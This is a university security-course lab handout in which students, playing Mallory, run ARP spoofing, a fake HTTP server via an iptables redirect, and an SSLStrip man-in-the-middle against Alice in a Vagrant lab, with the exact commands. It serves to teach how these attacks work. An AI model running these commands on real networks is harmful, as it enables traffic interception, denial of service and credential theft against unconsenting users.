# CSCD27 Lab 8: ARP spoofing and SSLStripping

## Vagrant Setup

Make sure to setup your environment as described in the [Vagrant Setup Guideline](https://github.com/ThierrySans/CSCD27-F16/blob/master/assignments/02/VAGRANT.md).

## Initial check

*As Alice*, test that Mathlab is reachable:

```shell
vagrant@alice:~$ curl http://mathlab.utsc.utoronto.ca/
```

## ARP Spoofing (Denial Of Service)

In this part, Mallory wants to disrupt the communication between Alice and the Gateway. To do so, Mallory will broadcast spoofed ARP packets to Alice saying that the gateway can be reached through Mallory's physical address.

*As Mallory (terminal 1), broadcast spoofed ARP messages to Alice (10.0.1.101) pretending to be the gateway (10.0.1.100):

```shell
vagrant@mallory:~$ sudo arpspoof -i eth1 -t 10.0.1.101 10.0.1.100
```

Finally:

- *As Alice*, test that Mathlab is no longer reachable.
- *As Mallory*, use Wireshark to see ARP spoofed messages and failed TCP messages

## ARP Spoofing (fake HTTP server)

In this part, rather than disrupting the communication between Alice and the Gateway, Mallory wants to setup a fake HTTP server pretending to be Mathlab. To do so, Mallory will first redirect HTTP messages to a fake server before spoofing the ARP messages.

*As Mallory* (terminal 1), start a fake HTTP server listening on port 8080

```shell
vagrant@mallory:~$ cd /vagrant/mallory/fake_http
vagrant@mallory:~$ python -m SimpleHTTPServer 8080
```

*As Mallory* (terminal 2), redirect HTTP traffic (coming from eth1 on port 80) to the fake HTTP server on Mallory's:

```shell
vagrant@mallory:~$ sudo bash -c "echo '1' > /proc/sys/net/ipv4/ip_forward"
vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp -i eth1 --dport 80 -j DNAT --to-destination 10.0.1.102:8080
```

*As Mallory* (terminal 2), broadcast spoofed ARP messages as done previously

Finally:

- *As Alice*, test that Mathlab is now reachable (but is it really mathlab?)
- *As Mallory*, use Wireshark to see the (fake) HTTP exchange

## Understanding HTTPS redirects

Before starting with this part, make sure to stop any ARPSpoofing you might have started.

As you may have noticed, it is possible to browse `mathlab.utsc.utoronto.ca` using both HTTP and HTTPS. You can also use curl to show the differences.

*As Alice*, use the `-v` option in curl to show the difference between HTTP abd HTTPS:

```shell
vagrant@alice:~$ curl -v http://mathlab.utsc.utoronto.ca/
vagrant@alice:~$ curl -v https://mathlab.utsc.utoronto.ca/
```

In practice, it is *strongly not recommended* to have the same content served with HTTP and HTTPS (see note about [mixed content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content)). Usually, the web server is configured to serve the content with HTTPS only. However, when someone uses HTTP, the server sends back a special HTTP response (HTTP Status Code 301: Moved Permanently) saying that the page has been relocated permanently to its HTTPS location. Conveniently, most web browsers follow this redirection automatically.

As an example, we have setup `http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/` to work like this. If you open this page (in HTTP) on your browser, you should see that you are being redirected automatically to `https://mathlab...`.

*As Alice*, use the `-v` option in curl to show the HTTP redirect response:

```shell
vagrant@alice:~$ curl -v http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/
```

*As Alice*, use the `-L` option in curl to follow the HTTPS redirects automatically (like most of web browsers do):

```shell
vagrant@alice:~$ curl -L http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/
```

## SSLStripping attack

The SSLStripping attack is a man-in-the-middle attack that aims at relaying messages between the victim and a web server. SSLStripping does not break the SSL tunnel that is resistant to man-in-the-middle attack however it works by intercepting the HTTPS redirects (sent in plaintext) to maintain an HTTP connection with the victim. Meanwhile, it sets up a connection with the server in HTTPS. Using that setup, the attacker can get all messages sent by the victim and all responses sent back from the server.

*As Mallory* (terminal 1), start an SSLStrip proxy on port 8080:

```shell
vagrant@mallory:~$ cd sslstrip-0.9
vagrant@mallory:~$ python sslstrip.py -a -w /vagrant/mallory/log.txt -l 8080 -f
```

*As Mallory* (terminal 2), broadcast spoofed ARP messages as done previously

Finally:

- *As Alice*, test that `http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/` is now reachable with HTTP
- *As Mallory*, open the file `log.txt` and see all HTTPS traffic